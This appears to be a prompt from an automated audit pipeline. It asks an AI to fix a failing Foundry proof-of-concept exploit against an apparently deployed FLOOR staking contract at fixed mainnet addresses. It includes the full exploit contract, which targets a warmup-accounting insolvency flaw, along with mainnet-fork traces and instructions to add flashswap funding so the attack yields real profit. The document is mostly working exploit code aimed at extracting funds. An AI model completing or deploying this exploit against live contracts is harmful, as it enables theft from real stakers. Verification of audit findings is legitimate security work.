You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Warmup deposits are rebased but never counted as liabilities, allowing staking insolvency
- claim: `stake()` transfers FLOOR into the contract and records warmup positions as `deposit` plus `gons`, while `claim()` later pays `sFLOOR.balanceForGons(info.gons)`, so warmup balances continue to appreciate with rebases. However, `rebase()` computes distributable surplus from `FLOOR.balanceOf(address(this)) - sFLOOR.circulatingSupply() - bounty` and never subtracts `gonsInWarmup` or `supplyInWarmup()`. Warmup-backed FLOOR is therefore treated as free excess reserves and redistributed to current stakers even though it is still owed to warmup claimants.
- impact: Large warmup balances can make the system undercollateralized. After one or more rebases, the contract can owe more sFLOOR/gFLOOR/FLOOR than it holds backing for, causing honest claimants or unstakers to receive unbacked positions or hit `unstake()` reverts due to insufficient FLOOR reserves.
- exploit_paths: ["Set `warmupPeriod > 0` and let some users already hold active staking positions.", "A user stakes FLOOR into warmup, increasing `gonsInWarmup` but not `sFLOOR.circulatingSupply()`.", "When `rebase()` runs, the newly deposited FLOOR is included in `balance` and treated as surplus because warmup liabilities are not subtracted.", "Existing stakers receive that value through rebases, while the warmup user still retains a claim for `sFLOOR.balanceForGons(info.gons)`.", "Total redeemable claims eventually exceed the contract's FLOOR backing, and withdrawals start failing."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IsFLOORLike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
    function balanceForGons(uint256 gons) external view returns (uint256);
}

interface IgFLOORLike is IERC20Like {
    function balanceFrom(uint256 amount) external view returns (uint256);
    function balanceTo(uint256 amount) external view returns (uint256);
}

interface IStakingLike {
    function FLOOR() external view returns (address);
    function sFLOOR() external view returns (address);
    function gFLOOR() external view returns (address);

    function warmupPeriod() external view returns (uint256);
    function supplyInWarmup() external view returns (uint256);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function warmupInfo(address account)
        external
        view
        returns (uint256 deposit, uint256 gons, uint256 expiry, bool lock);

    function stake(address to, uint256 amount, bool rebasing, bool claimNow) external returns (uint256);
    function claim(address to, bool rebasing) external returns (uint256);
    function unstake(address to, uint256 amount, bool trigger, bool rebasing) external returns (uint256);
    function rebase() external returns (uint256);
}

contract FlawVerifier {
    struct Claim {
        uint256 deposit;
        uint256 gons;
        uint256 expiry;
        bool lock;
    }

    IStakingLike internal constant STAKING =
        IStakingLike(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);

    bool private baselineCaptured;
    uint256 private baselineEquityInFloor;
    uint256 private realizedProfitInFloor;

    constructor() {}

    function executeOnOpportunity() public {
        _captureBaseline();
        _approveSpenders();

        // Path 0: the reported issue only exists when warmupPeriod > 0.
        uint256 warmupPeriod = STAKING.warmupPeriod();
        if (!(warmupPeriod > 0)) {
            _syncProfit();
            return;
        }

        // Path 0: the warmup deposit must be redistributed to existing active stakers.
        uint256 liveStakedSupply = _sFloor().circulatingSupply();
        if (liveStakedSupply == 0) {
            _syncProfit();
            return;
        }

        _bootstrapFloorBalance();

        uint256 floorToStake = _floor().balanceOf(address(this));
        if (floorToStake == 0) {
            _syncProfit();
            return;
        }

        // Single-call realization without time cheats only works if enough overdue
        // epochs already exist to:
        // 1. let the new warmup deposit be treated as surplus during rebase(), and
        // 2. advance epoch.number until the warmup position becomes claimable.
        if (_remainingImmediateRebases() < warmupPeriod + 1) {
            _syncProfit();
            return;
        }

        uint256 warmupSupplyBefore = STAKING.supplyInWarmup();

        // Path 1: stake FLOOR into warmup. On-chain this increments the protocol's
        // private gonsInWarmup accounting, but that liability is still excluded from
        // rebase() because rebase() only compares FLOOR balance against
        // sFLOOR.circulatingSupply().
        STAKING.stake(address(this), floorToStake, true, false);

        Claim memory info = _warmupInfo();
        if (info.gons == 0) {
            _syncProfit();
            return;
        }

        uint256 warmupSupplyAfter = STAKING.supplyInWarmup();
        if (warmupSupplyAfter <= warmupSupplyBefore) {
            _syncProfit();
            return;
        }

        // Path 2: consume all overdue rebases so the warmup-backed FLOOR gets counted
        // as distributable surplus to current stakers before this verifier claims.
        _consumeImmediateRebases();

        info = _warmupInfo();
        if (info.gons == 0) {
            _syncProfit();
            return;
        }

        // Path 3: claim still uses sFLOOR.balanceForGons(info.gons), so the warmup
        // claim keeps appreciating through rebases even though it was never included
        // in the liability side of the rebase surplus calculation.
        uint256 claimableSFloor = _sFloor().balanceForGons(info.gons);
        if (claimableSFloor == 0) {
            _syncProfit();
            return;
        }

        STAKING.claim(address(this), true);
        _approveSpenders();

        // Realize as much of the rebased claim as current FLOOR reserves allow. If
        // insolvency has already formed, optimistic unstakes may revert; the capped
        // fallback still measures the currently withdrawable profit without cheating.
        _realizeClaimedSFloor(claimableSFloor);
        _syncProfit();
    }

    function profitToken() external view returns (address) {
        return STAKING.FLOOR();
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitInFloor;
    }

    function _captureBaseline() internal {
        if (baselineCaptured) {
            return;
        }

        baselineCaptured = true;
        baselineEquityInFloor = _currentEquityInFloor();
    }

    function _bootstrapFloorBalance() internal {
        if (_floor().balanceOf(address(this)) != 0) {
            return;
        }

        _redeemVerifierSFloor();
        if (_floor().balanceOf(address(this)) != 0) {
            return;
        }

        _redeemVerifierGFloor();
    }

    function _redeemVerifierSFloor() internal {
        uint256 sBalance = _sFloor().balanceOf(address(this));
        if (sBalance == 0) {
            return;
        }

        uint256 reserves = _floor().balanceOf(address(STAKING));
        uint256 amount = sBalance < reserves ? sBalance : reserves;
        if (amount == 0) {
            return;
        }

        try STAKING.unstake(address(this), amount, _epochReady(), true) returns (uint256) {
            return;
        } catch {}

        try STAKING.unstake(address(this), amount, false, true) returns (uint256) {
            return;
        } catch {}
    }

    function _redeemVerifierGFloor() internal {
        uint256 gBalance = _gFloor().balanceOf(address(this));
        if (gBalance == 0) {
            return;
        }

        uint256 reserves = _floor().balanceOf(address(STAKING));
        if (reserves == 0) {
            return;
        }

        uint256 maxGByReserves = _gFloor().balanceTo(reserves);
        uint256 amount = gBalance < maxGByReserves ? gBalance : maxGByReserves;
        if (amount == 0) {
            return;
        }

        try STAKING.unstake(address(this), amount, _epochReady(), false) returns (uint256) {
            return;
        } catch {}

        try STAKING.unstake(address(this), amount, false, false) returns (uint256) {
            return;
        } catch {}
    }

    function _consumeImmediateRebases() internal {
        for (uint256 i = 0; i < 64; ++i) {
            if (!_epochReady()) {
                break;
            }
            STAKING.rebase();
        }
    }

    function _realizeClaimedSFloor(uint256 maxAmount) internal {
        uint256 sBalance = _sFloor().balanceOf(address(this));
        if (sBalance == 0) {
            return;
        }

        uint256 reserves = _floor().balanceOf(address(STAKING));
        if (reserves == 0) {
            return;
        }

        uint256 amount = sBalance;
        if (amount > maxAmount) {
            amount = maxAmount;
        }
        if (amount > reserves) {
            amount = reserves;
        }
        if (amount == 0) {
            return;
        }

        try STAKING.unstake(address(this), amount, _epochReady(), true) returns (uint256) {
            return;
        } catch {}

        try STAKING.unstake(address(this), amount, false, true) returns (uint256) {
            return;
        } catch {}
    }

    function _approveSpenders() internal {
        _floor().approve(address(STAKING), type(uint256).max);
        _sFloor().approve(address(STAKING), type(uint256).max);
    }

    function _warmupInfo() internal view returns (Claim memory info) {
        (info.deposit, info.gons, info.expiry, info.lock) = STAKING.warmupInfo(address(this));
    }

    function _currentEquityInFloor() internal view returns (uint256 equity) {
        equity = _floor().balanceOf(address(this));
        equity += _sFloor().balanceOf(address(this));

        uint256 gBalance = _gFloor().balanceOf(address(this));
        if (gBalance != 0) {
            equity += _gFloor().balanceFrom(gBalance);
        }

        Claim memory info = _warmupInfo();
        if (info.gons != 0) {
            equity += _sFloor().balanceForGons(info.gons);
        }
    }

    function _remainingImmediateRebases() internal view returns (uint256) {
        (uint256 length,, uint256 end,) = STAKING.epoch();
        if (length == 0 || end > block.timestamp) {
            return 0;
        }

        return ((block.timestamp - end) / length) + 1;
    }

    function _epochReady() internal view returns (bool) {
        (, , uint256 end,) = STAKING.epoch();
        return end <= block.timestamp;
    }

    function _floor() internal view returns (IERC20Like) {
        return IERC20Like(STAKING.FLOOR());
    }

    function _sFloor() internal view returns (IsFLOORLike) {
        return IsFLOORLike(STAKING.sFLOOR());
    }

    function _gFloor() internal view returns (IgFLOORLike) {
        return IgFLOORLike(STAKING.gFLOOR());
    }

    function _syncProfit() internal {
        uint256 currentFloorBalance = _floor().balanceOf(address(this));
        if (currentFloorBalance > baselineEquityInFloor) {
            realizedProfitInFloor = currentFloorBalance - baselineEquityInFloor;
        } else {
            realizedProfitInFloor = 0;
        }
    }
}

```

forge stdout (tail):
```
 AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xf59257E961883636290411c11ec5Ae622d19455e
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 5829

Traces:
  [153076] FlawVerifierTest::testExploit()
    ├─ [3417] FlawVerifier::profitToken() [staticcall]
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    ├─ [2468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [109067] FlawVerifier::executeOnOpportunity()
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   ├─ [468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [307] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::sFLOOR() [staticcall]
    │   │   └─ ← [Return] 0x164AFe96912099543BC2c48bb9358a095Db8e784
    │   ├─ [4875] 0x164AFe96912099543BC2c48bb9358a095Db8e784::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::gFLOOR() [staticcall]
    │   │   └─ ← [Return] 0xb1Cc59Fc717b8D4783D41F952725177298B5619d
    │   ├─ [2512] 0xb1Cc59Fc717b8D4783D41F952725177298B5619d::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [8934] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::warmupInfo(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0, 0, 0, false
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   ├─ [24535] 0xf59257E961883636290411c11ec5Ae622d19455e::approve(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000759c6de5bca9ade8a1a2719a31553c4b7de02539
    │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   ├─ [307] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::sFLOOR() [staticcall]
    │   │   └─ ← [Return] 0x164AFe96912099543BC2c48bb9358a095Db8e784
    │   ├─ [24465] 0x164AFe96912099543BC2c48bb9358a095Db8e784::approve(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x000000000000000000000000759c6de5bca9ade8a1a2719a31553c4b7de02539
    │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   └─ ← [Return] true
    │   ├─ [2364] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::warmupPeriod() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   ├─ [468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [917] FlawVerifier::profitToken() [staticcall]
    │   ├─ [264] 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539::FLOOR() [staticcall]
    │   │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    │   └─ ← [Return] 0xf59257E961883636290411c11ec5Ae622d19455e
    ├─ [289] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [468] 0xf59257E961883636290411c11ec5Ae622d19455e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xf59257E961883636290411c11ec5Ae622d19455e)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18068772 [1.806e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 5829)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.08s (1.72s CPU time)

Ran 1 test suite in 5.09s (5.08s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 153076)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
